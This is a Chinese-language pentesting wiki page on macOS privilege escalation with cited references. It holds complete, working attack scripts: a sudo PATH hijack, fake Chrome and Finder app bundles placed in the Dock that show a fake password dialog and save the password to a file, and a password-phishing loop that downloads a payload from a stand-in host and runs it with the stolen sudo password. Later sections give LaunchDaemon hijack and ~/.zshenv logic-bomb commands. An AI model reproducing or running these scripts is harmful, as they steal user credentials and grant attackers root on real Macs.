# macOS 权限提升

{{#include ../../banners/hacktricks-training.md}}

## TCC 权限提升

如果你来这里是为了查找 TCC 权限提升，请前往：


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

许多影响 Linux 或其他类 Unix 系统的权限提升技术同样适用于 macOS。请参阅：


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## 用户交互

### Sudo Hijacking

你可以在 [Linux Privilege Escalation 帖子中的 Sudo Hijacking 技术](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)中找到原始内容。

不过，macOS 在用户执行 **`sudo`** 时会**保留**其 **`PATH`**。这意味着，还可以通过**劫持受害者运行 `sudo` 时仍会执行的其他二进制文件**来实现这一攻击：

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

注意，使用终端的用户很可能已经安装了 **Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的二进制文件。

### Dock 伪装

通过一些**社会工程学**手段，你可以在 Dock 中**伪装成**例如 Google Chrome，并实际执行自己的脚本：

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
一些建议：

- 检查 Dock 中是否有 Chrome；如果有，**移除**该项，并在 Dock 数组中的相同位置**添加** **假的** **Chrome 项**。

<details>
<summary>Chrome Dock 伪装脚本</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
一些建议：

- 你**无法从 Dock 中移除 Finder**，所以如果要将它添加到 Dock，可以把假 Finder 放在真 Finder 旁边。为此，你需要**将假 Finder 条目添加到 Dock 数组的开头**。
- 另一种做法是不把它放在 Dock 中，直接打开它；“Finder 请求控制 Finder”并不奇怪。
- 另一种**无需询问密码即可提权到 root**、但会显示一个很糟糕的对话框的做法，是让 Finder 确实请求密码以执行特权操作：
  - 让 Finder 将一个新的 **`sudo`** 文件复制到 **`/etc/pam.d`**（密码提示会显示“Finder 想要复制 sudo”）
  - 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，使密码提示显示“Finder 想要复制 Finder.bundle”）

<details>
<summary>Finder Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### 密码提示钓鱼 + sudo 复用

恶意软件经常利用用户交互来**获取可用于 sudo 的密码**，并以编程方式复用。常见流程：

1. 使用 `whoami` 确定已登录用户。
2. **循环弹出密码提示**，直到 `dscl . -authonly "$user" "$pw"` 返回成功。
3. 缓存凭据（例如 `/tmp/.pass`），并使用 `sudo -S`（通过 stdin 输入密码）执行特权操作。

最简示例链：

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

被盗的密码随后可用于**通过 `xattr -c` 清除 Gatekeeper 隔离标记**、复制 LaunchDaemons 或其他特权文件，并以非交互方式运行后续阶段。<sup>[[1]](#references)</sup>

## 较新版本 macOS 专属的攻击向量（2023–2026）

### 已弃用的 `AuthorizationExecuteWithPrivileges` 仍可用

`AuthorizationExecuteWithPrivileges` 在 10.7 中已弃用，但**在 Sonoma/Sequoia 上仍然有效**。许多商业更新程序会调用 `/usr/libexec/security_authtrampoline`，并传入不可信路径。如果目标二进制文件可由用户写入，你就可以植入木马并利用合法的提示框：

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

与上文的 **masquerading tricks** 结合，呈现一个可信的密码对话框。


### 特权 helper / XPC 排查

许多现代第三方 macOS privescs 都遵循相同模式：**root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露一个 **Mach/XPC service**，随后 helper 要么**不验证客户端**，要么**验证得太晚**（PID race），要么暴露一个会处理**用户可控路径/script** 的 **root method**。许多近期 VPN 客户端、游戏启动器和更新程序中的 helper 漏洞都属于这类问题。<sup>[[2]](#references)</sup>

快速排查清单：

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

特别留意以下类型的 helper：

- 卸载后仍继续接受请求，因为 job 仍加载在 `launchd` 中
- 执行脚本或从 **`/Applications/...`** 或其他非 root 用户可写的路径读取配置
- 依赖基于 **PID** 或仅基于 **bundle-id** 的对端验证，可能存在竞态条件

有关 helper authorization 漏洞的详情，请查看[此页面](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)。

### PackageKit 脚本环境继承（CVE-2024-27822）

在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复此问题之前，通过 **`Installer.app`** / **`PackageKit.framework`** 发起的用户安装可能会在当前用户的环境中以 root 身份执行 **PKG 脚本**。这意味着，当受害者安装软件包时，使用 **`#!/bin/zsh`** 的软件包会加载攻击者的 **`~/.zshenv`**，并以 **root** 身份运行其中的内容。<sup>[[3]](#references)</sup>

这作为 **logic bomb** 尤其值得关注：你只需要在用户帐户中取得立足点，并找到一个可写的 shell 启动文件，然后等待用户执行任何存在漏洞的 **基于 zsh 的** 安装程序。通常，**MDM/Munki** 部署不受此问题影响，因为它们在 root 用户的环境中运行。<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

如果想更深入了解针对 installer 的滥用方式，也可以查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。

### 通过 `.localized` 造成安装目标路径冲突

某些第三方 installer 会注册一个 root LaunchDaemon，其可执行文件通过 `/Applications/Target.app` 内的固定路径引用。如果攻击者能先创建这个 bundle，并使用**不同的 bundle identifier**，Installer 可能会保留这个诱饵 bundle，并将真实应用安装到 `/Applications/Target.localized/Target.app`。LaunchDaemon 仍指向原始路径。因此，诱饵 bundle 中由攻击者控制的可执行文件之后可能会以 root 身份运行。<sup>[[8]](#references)</sup>

重要的前提条件包括：<sup>[[8]](#references)</sup>

1. 攻击者能够创建或控制预期的应用路径。
2. package 不会移除冲突的 bundle。
3. 特权 job 使用该 bundle 内的硬编码路径。
4. 用户或 MDM 工作流安装 package 并注册该 job。

查找被重新定位的 bundle，然后使用下一节中的枚举循环检查 LaunchDaemon 目标：<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

更安全的安装程序会解析最终 bundle 位置，并将特权可执行文件保存在 root 所有的位置，例如 `/Library/PrivilegedHelperTools`。在注册或启动任务前，还应验证所有权和代码签名。<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

LaunchDaemon plist 可能由 root 所有，但其 `Program` 或 `ProgramArguments` 的第一个条目指向用户可写目录。检查**整个路径**，而不只是可执行文件的权限模式。如果父目录可写，攻击者就可能重命名由 root 所有的可执行文件，并在相同路径创建替代文件。下次任务启动时，替代文件将以 root 身份运行。重启或正常的服务重启就足够了。攻击者无需拥有在 system 域中运行 `launchctl bootstrap` 的权限。<sup>[[7]](#references)</sup>

先枚举每个目标及其直接父目录：<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

当文件或其父目录可写时，保留原始二进制文件，并将该路径替换为可执行 payload。然后等待已加载的 daemon 重启。<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR 凭据指针竞争 (CVE-2025-24118)

存在漏洞的 `kauth_cred_proc_update` 路径使用非原子的 `zalloc_ro_mut` API 更新 `proc_ro.p_ucred`，而 SMR 读取方在未加锁的情况下读取该指针。公开的触发方式使用经过特殊准备的 setgid 二进制文件。一个线程在真实组 ID 和有效组 ID 之间切换，同时另一个线程反复调用 `getgid()` 等系统调用。<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

将其视为一种 **竞态原语**，而不是现成的 root exploit。已发布的 PoC 展示了凭据指针撕裂，通常会导致 kernel panic。研究人员只在 Intel 上复现了这种损坏，也没有实现对由此产生的凭据对象的确定性控制。Apple 在 macOS 15.3 中将更新改为原子指针交换。<sup>[[4]](#references)</sup>

### 通过 Migration assistant 绕过 SIP（“Migraine”，CVE-2023-32369）

即使已经获得 root，SIP 仍会阻止对系统位置的写入。**Migraine** 漏洞滥用 Migration Assistant entitlement `com.apple.rootless.install.heritable`，以生成一个继承 SIP 绕过权限的子进程，并覆盖受保护路径（例如 `/System/Library/LaunchDaemons`）。<sup>[[5]](#references)</sup> 攻击链：

1. 在运行中的系统上获得 root。
2. 使用精心构造的状态触发 `systemmigrationd`，使其运行攻击者控制的二进制文件。
3. 利用继承的 entitlement 修改受 SIP 保护的文件，且更改在重启后仍然保留。

### NSPredicate/XPC 表达式混淆（CVE-2023-23530/23531 漏洞类别）

多个 Apple 守护进程通过 XPC 接收 **NSPredicate** 对象，却只验证 `expressionType` 字段，而该字段由攻击者控制。通过构造一个可执行任意 selector 的 predicate，可以在 **root/system XPC 服务**中实现 **代码执行**（例如 `coreduetd`、`contextstored`）。如果再结合初始的 app sandbox escape，就能在**无需用户提示**的情况下实现 **权限提升**。查找那些反序列化 predicate、但缺少健壮 visitor 的 XPC endpoint。<sup>[[6]](#references)</sup>

## TCC - Root 权限提升

### CVE-2020-9771 - mount_apfs TCC 绕过与权限提升

**任何用户**（包括未提权用户）都可以使用 `-o noowners` 创建并挂载 Time Machine 快照，并**访问该快照中的所有文件**，从而绕过对运行中卷的所有权检查。唯一需要的权限是所用应用（例如 `Terminal`）具有**完全磁盘访问权限**（`kTCCServiceSystemPolicyAllfiles`）。

命令和完整说明见 TCC 绕过页面：

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## 敏感信息

这有助于提升权限：


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025：信息窃取程序之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165：AWS Client VPN for macOS 本地权限提升](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822：macOS PackageKit 权限提升](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE：CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft “Migraine” SIP 绕过（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS 和 iOS 上一种新的权限提升漏洞类别（CVE-2023-23530/23531）](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon 劫持：通过不安全的文件夹权限实现权限提升与持久化](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [通过 .localized 目录实现 macOS LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
